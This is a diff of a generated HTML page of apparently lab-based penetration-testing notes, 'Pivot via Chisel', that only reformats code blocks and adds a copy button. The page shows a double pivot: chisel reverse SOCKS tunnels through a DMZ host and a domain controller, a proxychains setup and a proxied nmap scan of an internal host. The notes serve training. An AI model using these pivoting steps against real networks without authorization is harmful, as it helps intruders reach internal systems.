@@ -7601,43 +7601,43 @@
 
   <h1>Pivot via Chisel</h1>
 
-<p>But du jeu:</p>
-<pre><code>Kali (10.10.14.227) &lt;&lt;10.10.14.0/24&gt;&gt; DMZ01 (10.129.58.6 | 172.16.8.120) &lt;&lt;192.16.8.0/24&gt;&gt; DC01 (172.16.8.3 | 172.16.9.3) &lt;&lt;172.16.9.0/24&gt;&gt; MGMT01 (172.16.9.25)`
-</code></pre>
+<p>But du jeu:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Kali (10.10.14.227) &lt;&lt;10.10.14.0/24&gt;&gt; DMZ01 (10.129.58.6 | 172.16.8.120) &lt;&lt;192.16.8.0/24&gt;&gt; DC01 (172.16.8.3 | 172.16.9.3) &lt;&lt;172.16.9.0/24&gt;&gt; MGMT01 (172.16.9.25)`
+</span></code></pre></div></p>
 <p>Sur notre pc attaquant:</p>
-<pre><code class="language-bash">./chisel_linux server --socks5 -p 9001 --reverse
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>./chisel_linux<span class="w"> </span>server<span class="w"> </span>--socks5<span class="w"> </span>-p<span class="w"> </span><span class="m">9001</span><span class="w"> </span>--reverse
+</span></code></pre></div>
 <p>/etc/proxychains</p>
-<pre><code class="language-bash">socks5 127.0.0.1 9999
-socks5 127.0.0.1 8888
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>socks5<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">9999</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>socks5<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">8888</span>
+</span></code></pre></div>
 <p>DMZ01:</p>
-<pre><code class="language-bash">./chisel_linux client 10.10.14.227:9001 R:9999:socks
-./chisel_linux server  -p 9002 --reverse --socks5 
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>./chisel_linux<span class="w"> </span>client<span class="w"> </span><span class="m">10</span>.10.14.227:9001<span class="w"> </span>R:9999:socks
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>./chisel_linux<span class="w"> </span>server<span class="w">  </span>-p<span class="w"> </span><span class="m">9002</span><span class="w"> </span>--reverse<span class="w"> </span>--socks5<span class="w"> </span>
+</span></code></pre></div>
 <p>DC01:</p>
-<pre><code class="language-bash">chisel.exe client 172.16.8.120:9002 R:8888:socks
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>chisel.exe<span class="w"> </span>client<span class="w"> </span><span class="m">172</span>.16.8.120:9002<span class="w"> </span>R:8888:socks
+</span></code></pre></div>
 <p>Now close any Socks4 connection (e.g. SSH Dynamic Port Forward) and comment in /etc/proxychains</p>
-<pre><code class="language-bash">#socks4 127.0.0.1 9050
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1">#socks4 127.0.0.1 9050</span>
+</span></code></pre></div>
 <p>Scan Target MGMT01 via socks5 proxy:</p>
-<pre><code class="language-bash">proxychains nmap -sT -p 22 172.16.9.25                                                    
-[proxychains] config file found: /etc/proxychains.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.14
-Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-11 17:27 EST
-[proxychains] Strict chain  ...  127.0.0.1:9999  ...  127.0.0.1:8888  ...  172.16.9.25:80 &lt;--socket error or timeout!
-[proxychains] Strict chain  ...  127.0.0.1:9999  ...  127.0.0.1:8888  ...  172.16.9.25:22  ...  OK
-RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
-Nmap scan report for 172.16.9.25
-Host is up (14s latency).
-
-PORT   STATE SERVICE
-22/tcp open  ssh
-
-Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>proxychains<span class="w"> </span>nmap<span class="w"> </span>-sT<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">172</span>.16.9.25<span class="w">                                                    </span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>config<span class="w"> </span>file<span class="w"> </span>found:<span class="w"> </span>/etc/proxychains.conf
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>preloading<span class="w"> </span>/usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>DLL<span class="w"> </span>init:<span class="w"> </span>proxychains-ng<span class="w"> </span><span class="m">4</span>.14
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.91<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2022</span>-11-11<span class="w"> </span><span class="m">17</span>:27<span class="w"> </span>EST
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>Strict<span class="w"> </span>chain<span class="w">  </span>...<span class="w">  </span><span class="m">127</span>.0.0.1:9999<span class="w">  </span>...<span class="w">  </span><span class="m">127</span>.0.0.1:8888<span class="w">  </span>...<span class="w">  </span><span class="m">172</span>.16.9.25:80<span class="w"> </span>&lt;--socket<span class="w"> </span>error<span class="w"> </span>or<span class="w"> </span>timeout!
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="o">[</span>proxychains<span class="o">]</span><span class="w"> </span>Strict<span class="w"> </span>chain<span class="w">  </span>...<span class="w">  </span><span class="m">127</span>.0.0.1:9999<span class="w">  </span>...<span class="w">  </span><span class="m">127</span>.0.0.1:8888<span class="w">  </span>...<span class="w">  </span><span class="m">172</span>.16.9.25:22<span class="w">  </span>...<span class="w">  </span>OK
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>RTTVAR<span class="w"> </span>has<span class="w"> </span>grown<span class="w"> </span>to<span class="w"> </span>over<span class="w"> </span><span class="m">2</span>.3<span class="w"> </span>seconds,<span class="w"> </span>decreasing<span class="w"> </span>to<span class="w"> </span><span class="m">2</span>.0
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">172</span>.16.9.25
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span>14s<span class="w"> </span>latency<span class="o">)</span>.
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">16</span>.31<span class="w"> </span>seconds
+</span></code></pre></div>
 
 
 
@@ -7684,7 +7684,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
